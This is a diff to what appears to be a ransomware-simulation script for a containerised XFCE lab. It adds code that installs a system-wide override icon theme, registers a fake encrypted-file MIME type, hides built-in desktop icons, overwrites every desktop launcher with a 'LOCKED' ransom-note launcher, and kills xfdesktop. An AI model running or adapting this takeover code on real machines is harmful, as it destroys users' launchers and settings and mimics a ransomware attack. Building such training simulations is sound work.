@@ -277,6 +277,180 @@ def seed_dummy_sensitive_files():
             print(f"[RANSOMWARE] Skip desktop seed {fpath}: {e}")
 
 
+def register_nara_encrypted_mime() -> None:
+    """
+    Register .NARA_ENCRYPTED as a custom MIME type with the R icon.
+
+    Root causes this function addresses:
+    - update-mime-database lowercases glob patterns by default, so
+      '*.NARA_ENCRYPTED' becomes '*.nara_encrypted' — we write to the
+      SYSTEM MIME db (/usr/share/mime) as root AND use globs2 with
+      weight 100 + case-sensitive flag so the pattern stays uppercase.
+    - elementary-xfce-dark theme doesn't exist in the image, but GTK
+      still falls back to hicolor — we write to BOTH system hicolor
+      (/usr/share/icons/hicolor) and the user dir to guarantee a cache hit.
+    - gtk-update-icon-cache fails on ~/.local/share/icons/hicolor because
+      there is no index.theme; the system hicolor has one and the cache
+      builds successfully.
+    """
+    import shutil as _shutil
+
+    # ── 1. Write MIME definition (user + system) ──────────────────────
+    # case-sensitive="true" prevents update-mime-database from lowercasing
+    # the glob, which is the default behavior that breaks .NARA_ENCRYPTED.
+    mime_xml = (
+        '<?xml version="1.0" encoding="UTF-8"?>\n'
+        '<mime-info xmlns="http://www.freedesktop.org/standards/shared-mime-info">\n'
+        '  <mime-type type="application/x-nara-encrypted">\n'
+        '    <comment>NARA Encrypted File</comment>\n'
+        '    <glob pattern="*.NARA_ENCRYPTED" case-sensitive="true"/>\n'
+        '  </mime-type>\n'
+        '</mime-info>\n'
+    )
+    for mime_pkg_dir in (
+        os.path.expanduser("~/.local/share/mime/packages"),
+        "/usr/share/mime/packages",
+    ):
+        try:
+            os.makedirs(mime_pkg_dir, exist_ok=True)
+            with open(os.path.join(mime_pkg_dir, "nara-encrypted.xml"), "w") as f:
+                f.write(mime_xml)
+        except OSError:
+            pass
+
+    # ── 2. Install R icon into SYSTEM hicolor (has index.theme → cache works) ──
+    for size in ("48x48", "32x32", "16x16"):
+        for icon_base in (
+            f"/usr/share/icons/hicolor/{size}/mimetypes",
+            os.path.expanduser(f"~/.local/share/icons/hicolor/{size}/mimetypes"),
+        ):
+            try:
+                os.makedirs(icon_base, exist_ok=True)
+                _shutil.copy(_ICON_WARN, os.path.join(icon_base, "application-x-nara-encrypted.png"))
+            except OSError:
+                pass
+
+    # ── 3. Rebuild MIME + icon caches (system paths first, always exist) ──
+    for cmd in (
+        ["update-mime-database", "/usr/share/mime"],
+        ["update-mime-database", os.path.expanduser("~/.local/share/mime")],
+        ["gtk-update-icon-cache", "-f", "/usr/share/icons/hicolor"],
+        ["gtk-update-icon-cache", "-f", "-t", os.path.expanduser("~/.local/share/icons/hicolor")],
+    ):
+        try:
+            subprocess.run(cmd, capture_output=True, timeout=30)
+        except (FileNotFoundError, subprocess.TimeoutExpired):
+            pass
+
+    print("[RANSOMWARE] Registered .NARA_ENCRYPTED MIME type with R icon (system + user)")
+
+
+def install_r_icon_theme() -> None:
+    """
+    Create and activate the NARA-Ransomware GTK icon theme.
+
+    Root causes this function addresses (discovered via live container debugging):
+    - The configured icon theme 'elementary-xfce-dark' doesn't exist on disk in
+      this Docker image. GTK falls back to Adwaita → hicolor.
+    - Installing icons only into hicolor/~/.local worked for MIME-type file icons
+      but xfdesktop's built-in 'Home' and 'File System' virtual shortcuts use
+      'user-home' / 'computer' — names that resolve via Adwaita's scalable SVG,
+      not our PNG files. Scalable SVGs override fixed-size PNGs in lookup order.
+    - Creating a NEW named theme that INHERITS from Adwaita+hicolor and overrides
+      only the icons we care about is the definitive solution. Setting this as the
+      ACTIVE xsettings icon theme via xfconf forces ALL GTK apps (including
+      xfdesktop itself) to use our R icons for every lookup.
+    """
+    import shutil as _shutil
+
+    genv = _xfce_session_environ()
+    theme_dir = "/usr/share/icons/NARA-Ransomware"
+    sizes = ("48x48", "32x32", "22x22", "16x16")
+    categories = ("places", "devices", "mimetypes", "filesystems", "apps")
+
+    # ── 1. Populate the theme with R icons for all relevant names ─────
+    place_names = [
+        "user-home", "folder", "inode-directory",
+        "user-desktop", "user-documents", "user-downloads",
+        "user-trash", "user-trash-full", "user-trash-empty",
+    ]
+    device_names = [
+        "computer", "drive-harddisk", "drive-harddisk-system",
+        "system", "computer-laptop",
+    ]
+    mime_names = [
+        "application-x-generic", "application-x-nara-encrypted",
+        "application-x-executable", "text-x-generic", "text-plain",
+        "image-x-generic", "video-x-generic", "audio-x-generic", "unknown",
+    ]
+    all_names: dict[str, list[str]] = {
+        "places": place_names,
+        "devices": device_names,
+        "mimetypes": mime_names,
+        "filesystems": ["drive-harddisk", "folder", "inode-directory"],
+    }
+
+    dir_entries = []
+    for size in sizes:
+        for cat, names in all_names.items():
+            cat_dir = os.path.join(theme_dir, size, cat)
+            os.makedirs(cat_dir, exist_ok=True)
+            for name in names:
+                try:
+                    _shutil.copy(_ICON_WARN, os.path.join(cat_dir, f"{name}.png"))
+                except OSError:
+                    pass
+            entry = f"{size}/{cat}"
+            if entry not in dir_entries:
+                dir_entries.append(entry)
+
+    # ── 2. Write index.theme ──────────────────────────────────────────
+    sections = []
+    for entry in dir_entries:
+        size_str = entry.split("/")[0]
+        sections.append(f"[{entry}]")
+        sections.append(f"Size={size_str.split('x')[0]}")
+        sections.append(f"Context={entry.split('/')[1].capitalize()}")
+        sections.append("Type=Fixed")
+        sections.append("")
+
+    index = (
+        "[Icon Theme]\n"
+        "Name=NARA-Ransomware\n"
+        "Comment=NARA Ransomware Icon Override\n"
+        "Inherits=Adwaita,hicolor\n"
+        f"Directories={','.join(dir_entries)}\n\n"
+        + "\n".join(sections)
+    )
+    with open(os.path.join(theme_dir, "index.theme"), "w") as f:
+        f.write(index)
+
+    # ── 3. Build icon cache ────────────────────────────────────────────
+    try:
+        subprocess.run(
+            ["gtk-update-icon-cache", "-f", theme_dir],
+            capture_output=True, timeout=30,
+        )
+    except (FileNotFoundError, subprocess.TimeoutExpired):
+        pass
+
+    # ── 4. Switch the active GTK icon theme to our override theme ─────
+    for prop, val in (
+        ("/Net/IconThemeName", "NARA-Ransomware"),
+        ("/Net/FallbackIconTheme", "Adwaita"),
+    ):
+        try:
+            subprocess.run(
+                ["xfconf-query", "-c", "xsettings", "-p", prop,
+                 "--create", "-t", "string", "-s", val],
+                capture_output=True, timeout=10, env=genv,
+            )
+        except (FileNotFoundError, OSError, subprocess.TimeoutExpired):
+            pass
+
+    print("[RANSOMWARE] NARA-Ransomware icon theme installed and activated")
+
+
 def _xfce_session_environ() -> dict:
     """Reuse the same DBus session as xfce4-session so gio/Thunar see icon metadata."""
     env = os.environ.copy()
@@ -439,15 +613,32 @@ def apply_r_icons_final(encrypted_paths: list[str] | None = None):
 
 
 def refresh_desktop_icons():
-    """Nudge xfdesktop to redraw after icon metadata changes (same session as desktop)."""
+    """
+    Hard-restart xfdesktop so it re-reads xfconf settings (hidden built-ins),
+    re-scans the desktop directory, and re-resolves all MIME-based icons from
+    the updated icon/MIME caches.
+
+    '--reload' only redraws — it does NOT re-read xfconf property changes or
+    flush the in-process icon-theme cache. A kill+restart is required after
+    changes to xfconf show-home-launcher/show-filesystem and after new MIME
+    type / icon cache updates.
+    """
+    import time
     env = _xfce_session_environ()
+    script = (
+        "pkill -x xfdesktop 2>/dev/null || true; "
+        "sleep 1; "
+        "DISPLAY=:1 xfdesktop &"
+    )
     try:
         subprocess.run(
-            ["bash", "-c", "xfdesktop --reload 2>/dev/null || true"],
+            ["bash", "-c", script],
             env=env,
             capture_output=True,
-            timeout=15,
+            timeout=20,
         )
+        time.sleep(2)
+        print("[RANSOMWARE] xfdesktop restarted — desktop re-rendered")
     except (OSError, subprocess.TimeoutExpired):
         pass
 
@@ -494,63 +685,23 @@ def hijack_desktop_shortcuts():
     """
     Replace ALL existing desktop shortcuts with Team Rocket R-branded locked versions,
     then drop ransom-themed shortcuts so the XFCE desktop visibly reflects the takeover.
+
+    Also hides xfdesktop's built-in Home/Filesystem/Trash virtual icons (which are NOT
+    .desktop files on disk) via xfconf-query, then drops replacement .desktop files so
+    they appear with the R icon instead of the originals.
     """
     desktop = _desktop_path()
     os.makedirs(desktop, exist_ok=True)
     readme = NOTE_FOR_LAUNCHERS
     rocket_icon = _ICON_FOLDER  # Red R on dark — used for all hijacked icons
+    genv = _xfce_session_environ()
 
-    # Replace ALL existing .desktop files with "LOCKED" versions using the R icon
-    for name in list(os.listdir(desktop)):
-        path = os.path.join(desktop, name)
-        if not name.endswith(".desktop") or "NARA_" in name or not os.path.isfile(path):
-            continue
-
-        # Extract the original app name from the .desktop file
-        original_name = name.replace(".desktop", "")
-        try:
-            with open(path, "r") as f:
-                for line in f:
-                    if line.startswith("Name="):
-                        original_name = line.strip().split("=", 1)[1]
-                        break
-        except Exception:
-            pass
-
-        # Overwrite the shortcut with a locked version using the R icon
-        locked_lines = [
-            "[Desktop Entry]",
-            "Version=1.0",
-            "Type=Application",
-            f"Name={original_name} — LOCKED",
-            "Comment=NARA ransomware simulation",
-            f"Icon={rocket_icon}",
-            "Terminal=false",
-            f"Exec=xfce4-terminal --hold -e \"bash -c 'head -60 {readme}; echo; echo ---; sleep 600'\"",
-            "",
-        ]
-        with open(path, "w", encoding="utf-8") as f:
-            f.write("\n".join(locked_lines))
-        try:
-            os.chmod(path, 0o755)
-        except OSError:
-            pass
-        print(f"[RANSOMWARE] Hijacked: {name} → {original_name} — LOCKED")
-
-    # Drop ransom shortcuts
-    templates = [
-        ("NARA__READ_ME.desktop", "!!! READ ME — RANSOM !!!", _ICON_WARN),
-        ("NARA__FILES_LOCKED.desktop", "Documents — ENCRYPTED", _ICON_FOLDER),
-        ("NARA__BROWSER_LOCKED.desktop", "Browser — ENCRYPTED", _ICON_BROWSER),
-        ("NARA__MAIL_LOCKED.desktop", "Mail — ENCRYPTED", _ICON_MAIL),
-    ]
-    for fname, title, icon in templates:
-        path = os.path.join(desktop, fname)
+    def _write_desktop(path: str, name: str, icon: str) -> None:
         lines = [
             "[Desktop Entry]",
             "Version=1.0",
             "Type=Application",
-            f"Name={title}",
+            f"Name={name}",
             "Comment=NARA ransomware simulation",
             f"Icon={icon}",
             "Terminal=false",
@@ -563,7 +714,68 @@ def hijack_desktop_shortcuts():
             os.chmod(path, 0o755)
         except OSError:
             pass
-        print(f"[RANSOMWARE] Desktop shortcut → {path}")
+
+    # ── Step 1: Hide xfdesktop built-in virtual icons (Home, Filesystem, Trash) ──
+    # These are NOT .desktop files — they are drawn by xfdesktop directly. The only
+    # way to replace them is to hide them via xfconf and drop our own .desktop files.
+    xfconf_hide = [
+        ("/desktop-icons/show-home",          "bool", "false"),  # home folder shortcut
+        ("/desktop-icons/show-home-launcher", "bool", "false"),  # Thunar launcher button
+        ("/desktop-icons/show-filesystem",    "bool", "false"),
+        ("/desktop-icons/show-trash",         "bool", "false"),
+        ("/desktop-icons/show-removable",     "bool", "false"),
+    ]
+    for prop, typ, val in xfconf_hide:
+        try:
+            subprocess.run(
+                ["xfconf-query", "-c", "xfce4-desktop", "-p", prop,
+                 "--create", "-t", typ, "-s", val],
+                capture_output=True, timeout=10, env=genv,
+            )
+        except (FileNotFoundError, OSError, subprocess.TimeoutExpired):
+            pass
+    print("[RANSOMWARE] xfdesktop built-in icons hidden via xfconf")
+
+    # Drop .desktop replacements for the now-hidden built-ins
+    for fname, title in [
+        ("home.desktop",       "Home — ENCRYPTED"),
+        ("filesystem.desktop", "File System — ENCRYPTED"),
+        ("trash.desktop",      "Trash — ENCRYPTED"),
+    ]:
+        _write_desktop(os.path.join(desktop, fname), title, rocket_icon)
+        print(f"[RANSOMWARE] Built-in replacement → {fname}")
+
+    # ── Step 2: Hijack any real .desktop files already on the desktop ──
+    for name in list(os.listdir(desktop)):
+        path = os.path.join(desktop, name)
+        if not name.endswith(".desktop") or "NARA_" in name or not os.path.isfile(path):
+            continue
+        if name in ("home.desktop", "filesystem.desktop", "trash.desktop"):
+            continue  # already replaced above
+
+        original_name = name.replace(".desktop", "")
+        try:
+            with open(path, "r") as f:
+                for line in f:
+                    if line.startswith("Name="):
+                        original_name = line.strip().split("=", 1)[1]
+                        break
+        except Exception:
+            pass
+
+        _write_desktop(path, f"{original_name} — LOCKED", rocket_icon)
+        print(f"[RANSOMWARE] Hijacked: {name} → {original_name} — LOCKED")
+
+    # ── Step 3: Drop the primary NARA ransom shortcuts ────────────────
+    templates = [
+        ("NARA__READ_ME.desktop",      "!!! READ ME — RANSOM !!!",  _ICON_WARN),
+        ("NARA__FILES_LOCKED.desktop", "Documents — ENCRYPTED",     _ICON_FOLDER),
+        ("NARA__BROWSER_LOCKED.desktop", "Browser — ENCRYPTED",     _ICON_BROWSER),
+        ("NARA__MAIL_LOCKED.desktop",  "Mail — ENCRYPTED",          _ICON_MAIL),
+    ]
+    for fname, title, icon in templates:
+        _write_desktop(os.path.join(desktop, fname), title, icon)
+        print(f"[RANSOMWARE] Desktop shortcut → {fname}")
 
 
 # ── Team Rocket "R" bitmap (16x20 grid, 1 = red, 0 = background) ────
@@ -770,6 +982,13 @@ def main(custom_message: str = ""):
     shutdown_vulnerable_webapp()
     drop_ransom_note(custom_message)
     generate_rocket_icons()
+    # Install R icon theme FIRST so xfdesktop's next scan uses R for everything.
+    # This handles both MIME-type file icons AND xfdesktop built-in shortcuts
+    # (Home, Filesystem) which are controlled by the active GTK icon theme.
+    install_r_icon_theme()
+    # Register MIME type + install icon system-wide so .NARA_ENCRYPTED files
+    # resolve to 'application-x-nara-encrypted' and get the R icon.
+    register_nara_encrypted_mime()
     # All victim files exist before we touch .desktop launchers or encrypt.
     seed_dummy_sensitive_files()
     hijack_desktop_shortcuts()
